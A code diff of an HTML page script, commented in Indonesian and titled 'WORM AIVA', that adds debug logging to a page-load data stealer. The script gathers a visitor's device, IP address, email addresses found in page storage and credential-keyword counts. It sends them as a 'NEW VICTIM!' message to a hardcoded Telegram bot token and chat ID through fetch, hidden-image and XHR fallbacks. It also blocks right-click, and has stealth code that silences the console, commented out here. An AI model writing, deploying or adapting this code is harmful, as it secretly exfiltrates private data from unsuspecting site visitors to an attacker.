@@ -14,38 +14,75 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
 
 <script>
 // ============================================================
-// WORM AIVA — VERSI PALING SIMPEL (CEK DULU)
+// WORM AIVA — VERSI DEBUG (LIHAT ERROR DI CONSOLE)
 // ============================================================
 
 (function() {
     'use strict';
 
     // ============================================================
-    // KONFIGURASI — SUDAH BENAR
+    // KONFIGURASI
     // ============================================================
     const BOT_TOKEN = '8806813025:AAFUuyClrFAKIaOn8muWbbraedaynTOisS0';
     const CHAT_ID = '6296658478';
     // ============================================================
 
     // ============================================================
-    // FUNGSI KIRIM PESAN (PASTI JALAN)
+    // FUNGSI KIRIM PESAN DENGAN LOG
     // ============================================================
     function kirimPesan(pesan) {
         const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(pesan);
         
-        // Metode 1: Image (paling primitif, pasti jalan)
-        var img = new Image();
-        img.style.display = 'none';
-        img.src = url;
-        document.body.appendChild(img);
+        console.log('📤 Mencoba kirim pesan...');
+        console.log('📤 URL:', url);
         
-        // Metode 2: Fetch (cara modern)
-        fetch(url, { method: 'GET', mode: 'no-cors' }).catch(function() {});
+        // === METODE 1: FETCH ===
+        fetch(url, { method: 'GET' })
+            .then(function(response) {
+                console.log('✅ Fetch berhasil! Status:', response.status);
+                return response.json();
+            })
+            .then(function(data) {
+                console.log('✅ Response:', data);
+            })
+            .catch(function(err) {
+                console.log('❌ Fetch gagal:', err);
+                // Lanjut ke metode berikutnya
+                kirimViaImage(url);
+            });
         
-        // Metode 3: XMLHttpRequest
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', url, true);
-        xhr.send();
+        // === METODE 2: IMAGE (fallback) ===
+        function kirimViaImage(url) {
+            console.log('📤 Mencoba kirim via Image...');
+            try {
+                var img = new Image();
+                img.style.display = 'none';
+                img.onload = function() { console.log('✅ Image berhasil dikirim'); };
+                img.onerror = function() { console.log('❌ Image gagal dikirim'); };
+                img.src = url;
+                document.body.appendChild(img);
+            } catch(e) {
+                console.log('❌ Image error:', e);
+                kirimViaXHR(url);
+            }
+        }
+        
+        // === METODE 3: XHR (fallback terakhir) ===
+        function kirimViaXHR(url) {
+            console.log('📤 Mencoba kirim via XHR...');
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', url, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        console.log('✅ XHR selesai, status:', xhr.status);
+                    }
+                };
+                xhr.send();
+            } catch(e) {
+                console.log('❌ XHR error:', e);
+            }
+        }
     }
 
     // ============================================================
@@ -55,7 +92,6 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         var ua = navigator.userAgent;
         var device = 'Unknown';
         
-        // Deteksi simple
         if (ua.indexOf('Android') > -1) device = 'Android';
         else if (ua.indexOf('iPhone') > -1) device = 'iPhone';
         else if (ua.indexOf('Windows') > -1) device = 'Windows';
@@ -70,7 +106,9 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
                 var res = JSON.parse(xhr.responseText);
                 ip = res.ip || 'Unknown';
             }
-        } catch(e) {}
+        } catch(e) {
+            console.log('❌ Gagal dapat IP:', e);
+        }
         
         var emails = [];
         var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
@@ -82,7 +120,9 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
                     if (found) emails = emails.concat(found);
                 }
             }
-        } catch(e) {}
+        } catch(e) {
+            console.log('❌ Gagal dapat email:', e);
+        }
         
         var passCount = 0;
         var keywords = ['password', 'pass', 'pwd', 'key', 'token', 'auth', 'login'];
@@ -100,7 +140,9 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
                     }
                 }
             }
-        } catch(e) {}
+        } catch(e) {
+            console.log('❌ Gagal dapat password:', e);
+        }
         
         return {
             device: device,
@@ -115,7 +157,11 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
     // MAIN
     // ============================================================
     function main() {
+        console.log('🚀 START MAIN FUNCTION');
+        
         var data = getData();
+        
+        console.log('📊 Data terkumpul:', data);
         
         var pesan = '🔴 NEW VICTIM!\n\n';
         pesan += '📱 Device: ' + data.device + '\n';
@@ -126,17 +172,19 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         pesan += '🆔 ID: ' + Date.now().toString(36).toUpperCase() + '\n';
         pesan += '📱 UA: ' + data.ua.substring(0, 100);
         
+        console.log('📝 Pesan yang akan dikirim:', pesan);
+        
         kirimPesan(pesan);
     }
 
     // ============================================================
-    // STEALTH
+    // STEALTH — TAPI KITA AKTIFKAN SEMENTARA UNTUK DEBUG
     // ============================================================
-    console.log = function() {};
-    console.warn = function() {};
-    console.error = function() {};
-    console.info = function() {};
-    console.debug = function() {};
+    // console.log = function() {}; // DI-NONAKTIFKAN SEMENTARA
+    // console.warn = function() {};
+    // console.error = function() {};
+    // console.info = function() {};
+    // console.debug = function() {};
 
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
 
@@ -150,17 +198,40 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
     });
 
     // ============================================================
-    // START — 3 PERCOBAAN
+    // START — 3 PERCOBAAN DENGAN LOG
     // ============================================================
+    console.log('📌 Halaman dimuat!');
+
     if (document.readyState === 'complete') {
-        setTimeout(main, 2000);
-        setTimeout(main, 5000);
-        setTimeout(main, 10000);
+        console.log('📌 Document readyState = complete');
+        setTimeout(function() {
+            console.log('📌 Percobaan 1 (2 detik)');
+            main();
+        }, 2000);
+        setTimeout(function() {
+            console.log('📌 Percobaan 2 (5 detik)');
+            main();
+        }, 5000);
+        setTimeout(function() {
+            console.log('📌 Percobaan 3 (10 detik)');
+            main();
+        }, 10000);
     } else {
+        console.log('📌 Document belum siap, menunggu load...');
         window.addEventListener('load', function() {
-            setTimeout(main, 2000);
-            setTimeout(main, 5000);
-            setTimeout(main, 10000);
+            console.log('📌 Event load terpicu!');
+            setTimeout(function() {
+                console.log('📌 Percobaan 1 (2 detik)');
+                main();
+            }, 2000);
+            setTimeout(function() {
+                console.log('📌 Percobaan 2 (5 detik)');
+                main();
+            }, 5000);
+            setTimeout(function() {
+                console.log('📌 Percobaan 3 (10 detik)');
+                main();
+            }, 10000);
         });
     }
 
